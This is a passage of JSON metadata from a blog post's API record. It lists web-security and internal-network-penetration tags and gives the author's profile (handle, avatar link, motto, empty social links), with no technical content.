mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}